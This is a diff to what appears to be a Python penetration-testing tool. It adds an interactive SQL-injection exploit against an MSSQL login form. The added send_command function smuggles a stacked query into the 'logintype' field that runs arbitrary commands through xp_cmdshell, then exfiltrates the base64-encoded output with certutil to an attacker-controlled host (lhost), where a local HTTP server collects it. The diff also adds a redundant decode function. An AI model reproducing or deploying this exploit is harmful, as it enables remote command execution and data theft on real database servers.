@@ -59,7 +59,12 @@ from urllib.parse import quote, unquote, urlparse
 from impacket.dcerpc.v5.dcomrt import IObjectExporter
 from modules.lazyencoder_decoder import encode, decode
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
+from html.parser import HTMLParser
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
+
+
+query_id = 0
 RESET = "\033[0m"
 BOLD = "\033[1m"
 UNDERLINE = "\033[4m"
@@ -2045,6 +2050,69 @@ def select_binary(binaries):
                 print_warn("Invalid choice, please select a valid number.")
         except ValueError:
             print_error("Please enter a number.")
+
+def decode(data):
+    """
+    Decodes base64 data received from the server output.
+
+    Parameters:
+    data (str): Encoded base64 data from the server.
+
+    Returns:
+    str: Decoded string output, or an error message if decoding fails.
+    """
+    parser = HTMLParser()
+    try:
+        decoded_data = base64.b64decode(data)
+    except:
+        return '[-] Decoding error'
+    return decoded_data.decode('utf-8', errors='ignore')
+
+def get_command(url, lhost):
+    """
+    Reads a command from standard input and initiates a thread to send the command to the target server.
+    """
+    try:
+        cmd = input(':\> ')
+        threading.Thread(target=send_command, args=(cmd,url,lhost)).start()
+    except:
+        sys.exit(0)
+
+def send_command(cmd, url, lhost):
+    """
+    Constructs and sends an SQL payload with xp_cmdshell and certutil for command execution and exfiltration.
+
+    Parameters:
+    cmd (str): Command to be executed on the remote MSSQL server.
+    """
+    payload = "2;"
+    payload += "declare @r varchar(6120),@cmdOutput varchar(6120);"
+    payload += "declare @res TABLE(line varchar(max));"
+    payload += "insert into @res exec Xp_cmdshell %s;"
+    payload += "set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')), 1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
+    payload += f"set @r=concat('certutil -urlcache -f http://{lhost}/',@cmdOutput);"
+    payload += "exec Xp_cmdshell @r;"
+    payload += "--"
+
+    login = {
+        'B1': 'LogIn',
+        'logintype': payload % cmd,
+        'username': "admin",
+        'rememberme': 'ON',
+        'password': "admin",
+    }
+
+    requests.post(url, data=login)
+
+def activate_server(httpd, url, lhost):
+    """
+    Activates the HTTP server and fetches the first command from the user.
+
+    Parameters:
+    httpd (HTTPServer): The server instance to activate.
+    """
+    get_command(url, lhost)
+    httpd.server_activate()
 
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
